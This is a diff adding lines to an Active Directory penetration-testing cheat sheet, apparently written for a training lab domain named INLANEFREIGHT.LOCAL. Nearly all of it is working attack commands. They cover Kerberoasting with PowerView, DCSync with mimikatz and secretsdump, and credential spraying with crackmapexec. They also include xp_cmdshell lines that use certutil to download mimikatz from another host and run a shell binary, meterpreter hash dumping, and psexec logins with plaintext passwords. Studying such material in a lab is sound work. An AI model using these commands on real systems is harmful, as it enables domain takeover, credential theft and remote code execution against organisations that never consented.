@@ -13,9 +13,33 @@
 - [Phase 8: Attacking AD Trusts - Cross-Forest](#phase-8-attacking-ad-trusts-cross-forest-trust-abuse)
 
 **Note:**
-- On getting a foot hold, check 'systeminfo` for later payload crafting.
-- Finding SPN account (powerview): `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
-- Targeting a SPN account (powerview): `Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\svc\_sql\_tgs.csv -NoTypeInformation`
+- On getting a foothold, check 'systeminfo` for later payload crafting.
+- **Finding SPN account** (powerview): `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
+- **Targeting a SPN account** (powerview): `Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\svc_sql_tgs.csv -NoTypeInformation`
+- powershell **smb** windows2windows: `net use \\\\IP-OR-HOST-NAME\\C$ /user:INLANEFREIGHT.LOCAL\\svc_sql lucky7`
+- Target pwd user for ACL enum: `$sid = Convert-NameToSid wley`
+- ACL enum: `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
+- DCSync: `mimikatz.exe lsadump::dcsync` or `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3` (need that 2 priv and target on DC ip)
+
+- username wordlist: `sudo crackmapexec smb 172.16.7.3 -u ab920 -p weasal --users | tee  usernames.txt`
+- SQL exploit file transfer: `xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/mimikatz.exe C:\Users\Public\mimikatz.exe"`
+- SQL exploit file execution: `xp_cmdshell C:\Users\Public\ps.exe -c "C:\Users\Public\shell.exe"`
+- meterpreter dumping:
+```
+meterpreter > getuid
+meterpreter > hashdump
+meterpreter > load kiwi
+meterpreter > lsa_dump_sam
+meterpreter > creds_all
+```
+- Target domain group: `ConvertTo-SID 'Domain Admins'`, `$adminsid = ConvertTo-SID 'Domain Admins'`
+- Enum domain group: `Get-DomainObjectACL -ResolveGUIDs -Identity $adminsid`.
+- convert sid: `Convert-SidtoName "S-1-5-21-3327542485-274640656-2609762496-4611"`
+- DCSync:
+```
+psexec.py inlanefreight.local/CT059:charlie1@172.16.7.3
+lsadump::dcsync /user:inlanefreight\krbtgt
+```
 
 # Additional AD Auditing Techniques
 
